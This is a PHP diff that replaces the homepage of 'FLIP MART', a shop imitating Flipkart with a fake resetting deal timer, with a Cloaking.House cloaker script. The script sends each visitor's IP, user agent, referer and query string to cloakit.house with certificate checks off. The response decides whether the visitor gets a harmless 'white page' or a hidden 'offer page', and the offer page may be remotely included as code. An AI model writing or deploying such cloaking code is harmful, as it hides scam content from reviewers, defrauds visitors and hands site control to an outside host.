@@ -1,136 +1,229 @@
 <?php
-require_once __DIR__ . '/../../includes/data.php';
-require_once __DIR__ . '/../../includes/helpers.php';
 
-$PAGE_SIZE = 20;
-$products   = get_all_products();
-$categories = get_categories();
-$first_page = paginate($products, 1, $PAGE_SIZE);
-$total      = count($products);
+    // Не рекомендуется вносить самостоятельно изменения в скрипт, так как любые последствия неработоспособности будут лежать на вас.
+    // С уважением, Cloaking.House
 
-$page_title = 'Shop Online for Fashion, Electronics & More | FLIP MART';
-$menu_categories = $categories;
-include __DIR__ . '/../../includes/layout-head.php';
-?>
-  <div class="main-container">
-    <?php include __DIR__ . '/../../includes/header.php'; ?>
-    <main>
-      <section class="main-banner-container p-2">
-        <div id="mainCarousel" class="carousel slide" data-bs-ride="carousel">
-          <div class="carousel-inner rounded-3">
-            <div class="carousel-item active"><img src="/assets/catogary/banner1.webp" class="d-block w-100" alt="Banner 1" /></div>
-            <div class="carousel-item"><img src="/assets/catogary/banner2.webp" class="d-block w-100" alt="Banner 2" /></div>
-          </div>
-        </div>
-      </section>
 
-      <section class="categories-container">
-        <div class="categories-grid">
-          <?php foreach ($categories as $c): ?>
-            <div class="category-item">
-              <a href="/category?category=<?= h(urlencode($c['slug'] ?? '')) ?>">
-                <img src="<?= h($c['image'] ?? '') ?>" alt="<?= h($c['alt'] ?? '') ?>" />
-                <p class="category-label"><?= h($c['label'] ?? '') ?></p>
-              </a>
-            </div>
-          <?php endforeach; ?>
-        </div>
-      </section>
+    // It is not recommended to make changes to this script on your own, as any consequences of malfunction will be your responsibility.
+    // Sincerely, Cloaking.House
 
-      <div class="deal-banner">
-        <div class="deal-left">
-          <div class="deal-title">Deals of the Day</div>
-          <div class="deal-timer"><span id="dealTimer">05:38</span></div>
-        </div>
-        <div class="sale-badge">SALE IS LIVE</div>
-      </div>
 
-      <section class="products-section">
-        <div class="mainbody" id="productsGrid">
-          <?php foreach ($first_page as $p) {
-              include __DIR__ . '/../../includes/product-card.php';
-          } ?>
-        </div>
-        <div id="infiniteLoader" style="text-align:center;padding:20px">
-          <div class="spinner-border text-primary" role="status">
-            <span class="visually-hidden">Loading...</span>
-          </div>
-        </div>
-      </section>
-    </main>
-  </div>
 
-  <?php include __DIR__ . '/../../includes/footer.php'; ?>
+    error_reporting(0);
+    
+    
+    if (function_exists('mb_internal_encoding')) {
+        mb_internal_encoding('UTF-8');
+    }
 
-  <script>
-    // Deals timer
-    (function () {
-      var el = document.getElementById('dealTimer');
-      if (!el) return;
-      var s = 5 * 60 + 38;
-      setInterval(function () {
-        if (s < 0) s = 5 * 60 + 38;
-        var m = String(Math.floor(s / 60)).padStart(2, '0');
-        var ss = String(s % 60).padStart(2, '0');
-        el.textContent = m + ':' + ss;
-        s--;
-      }, 1000);
-    })();
 
-    // Infinite scroll
-    (function () {
-      var page = 2;
-      var loading = false;
-      var done = false;
-      var grid = document.getElementById('productsGrid');
-      var loader = document.getElementById('infiniteLoader');
+    if (version_compare(PHP_VERSION, '7.2', '<')) {
+        exit('PHP 7.2 or higher is required.');
+    }
 
-      function loadMore() {
-        if (loading || done) return;
-        if ((window.innerHeight + window.scrollY) < (document.body.offsetHeight - 500)) return;
-        loading = true;
-        fetch('/api/products?page=' + page)
-          .then(function (r) { return r.json(); })
-          .then(function (data) {
-            if (!data.products || data.products.length === 0) {
-              done = true;
-              if (loader) loader.style.display = 'none';
-              return;
+
+    if ( ! extension_loaded('curl')) {
+        exit('The cURL PHP extension is required.');
+    }
+
+
+    if ( ! extension_loaded('mbstring')) {
+        exit('The mbstring PHP extension is required.');
+    }
+
+
+    if ( ! extension_loaded('openssl')) {
+        exit('The OpenSSL PHP extension is required.');
+    }
+
+
+    if ( ! extension_loaded('json')) {
+        exit('The JSON PHP extension is required.');
+    }
+
+
+    if ( ! extension_loaded('filter')) {
+        exit('The Filter PHP extension is required.');
+    }
+
+
+    if ( ! ini_get('allow_url_fopen')) {
+        exit('The "allow_url_fopen" setting must be enabled in php.ini.');
+    }
+
+
+    function get_real_ip_address()
+    {
+        $remote_addr        = ! empty($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '0.0.0.0';
+        $allowed_headers    = [
+            'HTTP_CF_CONNECTING_IP',
+            'HTTP_TRUE_CLIENT_IP',
+            'HTTP_X_REAL_IP',
+            'HTTP_X_FORWARDED_FOR'
+        ];
+
+
+        foreach ($allowed_headers AS $header) {
+            if ( ! empty($_SERVER[$header])) {
+                $ips = explode(',', $_SERVER[$header]);
+                foreach ($ips AS $ip) {
+                    
+                    $ip = trim($ip);
+                    $ip = preg_replace('/:\d+$/', '', $ip);
+                    $ip = trim($ip, '[]');
+
+                    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
+                        return trim($ip);
+                    }
+                }
             }
-            data.products.forEach(function (p) { grid.insertAdjacentHTML('beforeend', renderCard(p)); });
-            page++;
-          })
-          .catch(function () {})
-          .finally(function () { loading = false; });
-      }
-
-      function renderCard(p) {
-        var rating = parseFloat(p.rating) || 4.5;
-        var stars = Math.round(rating * 2) / 2;
-        var full = Math.floor(stars);
-        var half = (stars - full) >= 0.5;
-        var starsHtml = '';
-        for (var i = 1; i <= 5; i++) {
-          if (i <= full) starsHtml += '<i class="bi bi-star-fill"></i>';
-          else if (half && i === full + 1) starsHtml += '<i class="bi bi-star-half"></i>';
-          else starsHtml += '<i class="bi bi-star"></i>';
         }
-        var wow = p.wow_price || Math.round((p.price || 0) * 0.95);
-        var name = (p.name || p.title || '').replace(/</g, '&lt;');
-        var mrp = (p.mrp || 0).toLocaleString('en-IN');
-        return '<a href="/product?pid=' + p.pid + '" class="products"><div class="productcard">' +
-          '<div class="imagecontainer"><img src="' + (p.image || '') + '" class="productimage" loading="lazy" alt="' + name + '" /></div>' +
-          '<div class="product-info"><p class="product-name">' + name + '</p>' +
-          '<div class="price-line"><span class="selling-price">&#8377;' + p.price + '</span>' +
-          '<del class="mrp">&#8377;' + mrp + '</del>' +
-          '<span class="discount">' + (p.discount || '') + '</span></div>' +
-          '<div class="wow-offer"><img class="wow-badge" src="/assets/catogary/wow.webp" alt="WOW Offer" />' +
-          '<span class="wow-price">&#8377;' + wow + '</span><span class="offer-text">with 2 offers</span></div>' +
-          '<div class="rating-line"><div class="rating-stars">' + starsHtml + '</div>' +
-          '<img class="fassured-logo-small" src="/assets/catogary/assured.png" alt="F-Assured" /></div>' +
-          '</div></div></a>';
-      }
 
-      window.addEventListener('scroll', loadMore);
-    })();
-  </script>
+
+        return $remote_addr;
+    }
+
+
+    function create_stream_context()
+    {
+        return stream_context_create([
+            'ssl' => [
+                'verify_peer' => FALSE, 
+                'verify_peer_name' => FALSE
+            ], 
+            'http' => [
+                'header' => 'User-Agent: ' . get_user_agent()
+            ]
+        ]);
+    }
+
+
+    function get_user_agent()
+    {
+        return ! empty($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+    }
+
+
+    function get_referer()
+    {
+        return ! empty($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
+    }
+
+
+    function get_query_string()
+    {
+        return ! empty($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '';
+    }
+
+
+    function get_browser_language()
+    {
+        return ! empty($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : '';
+    }
+
+
+    $request_data = [
+        'label'         => 'bd132aed21d4e81084c31665fd2aeaed', 
+        'user_agent'    => get_user_agent(), 
+        'referer'       => get_referer(), 
+        'query'         => get_query_string(), 
+        'lang'          => get_browser_language(),
+        'ip_address'    => get_real_ip_address()
+    ];
+        
+
+    $request_data   = http_build_query($request_data);
+    $success_codes  = [200, 201, 204, 206];
+
+
+    $ch = curl_init('https://cloakit.house/api/v1/check');
+    curl_setopt_array($ch, [
+        CURLOPT_RETURNTRANSFER  => TRUE,
+        CURLOPT_CUSTOMREQUEST   => 'POST',
+        CURLOPT_SSL_VERIFYPEER  => FALSE,
+        CURLOPT_TIMEOUT         => 15,
+        CURLOPT_POSTFIELDS      => $request_data
+    ]);
+
+    
+    $result = curl_exec($ch);
+    $info   = curl_getinfo($ch);
+    curl_close($ch);
+
+
+    if (isset($info['http_code']) && in_array($info['http_code'], $success_codes)) {
+        $body = json_decode($result, TRUE);
+
+        // Check for errors
+        if ( ! empty($body['filter_type'])) {
+            
+            $messages = [
+                'subscription_expired'  => 'Your Subscription Expired.',
+                'flow_deleted'          => 'Flow Deleted.',
+                'flow_banned'           => 'Flow Banned.',
+            ];
+        
+            if (isset($messages[$body['filter_type']])) {
+                exit($messages[$body['filter_type']]);
+            }
+        }
+        
+
+        if ( ! empty($body['url_white_page']) && ! empty($body['url_offer_page'])) {
+
+            // Offer Page
+            if ($body['filter_page'] == 'offer') {
+                if ($body['mode_offer_page'] == 'loading') {
+                    if (filter_var($body['url_offer_page'], FILTER_VALIDATE_URL)) {
+                        echo str_replace('<head>', '<head><base href="' . $body['url_offer_page'] . '" />', file_get_contents($body['url_offer_page'], FALSE, create_stream_context()));
+                    } elseif (file_exists($body['url_offer_page'])) {
+                        if (pathinfo($body['url_offer_page'], PATHINFO_EXTENSION) == 'html') {
+                            echo file_get_contents($body['url_offer_page'], FALSE, create_stream_context());
+                        } else {
+                            require_once($body['url_offer_page']);
+                        }
+                    } else {
+                        exit('Offer Page Not Found.');
+                    }
+                }
+
+                if ($body['mode_offer_page'] == 'redirect') {
+                    header('Location: ' . $body['url_offer_page'], TRUE, 302);
+                    exit(0);
+                }
+
+                if ($body['mode_offer_page'] == 'iframe') {
+                    echo '<iframe src="' . $body['url_offer_page'] . '" width="100%" height="100%" align="left"></iframe><style> body { padding: 0; margin: 0; } iframe { margin: 0; padding: 0; border: 0; }</style>';
+                    exit(0);
+                }
+            }
+
+            // White Page
+            if ($body['filter_page'] == 'white') {
+                if ($body['mode_white_page'] == 'loading') {
+                    if (filter_var($body['url_white_page'], FILTER_VALIDATE_URL)) {
+                        echo str_replace('<head>', '<head><base href="' . $body['url_white_page'] . '" />', file_get_contents($body['url_white_page'], FALSE, create_stream_context()));
+                    } elseif (file_exists($body['url_white_page'])) {
+                        if (pathinfo($body['url_white_page'], PATHINFO_EXTENSION) == 'html') {
+                            echo file_get_contents($body['url_white_page'], FALSE, create_stream_context());
+                        } else {
+                            require_once($body['url_white_page']);
+                        }
+                    } else {
+                        exit('White Page Not Found.');
+                    }
+                }
+
+                if ($body['mode_white_page'] == 'redirect') {
+                    header('Location: ' . $body['url_white_page'], TRUE, 302);
+                    exit(0);
+                }
+            }
+        } else {
+            exit('Offer Page or White Page Not Found.');
+        }
+    } else {
+        exit('Try again later or contact support.');
+    }
+
+?>
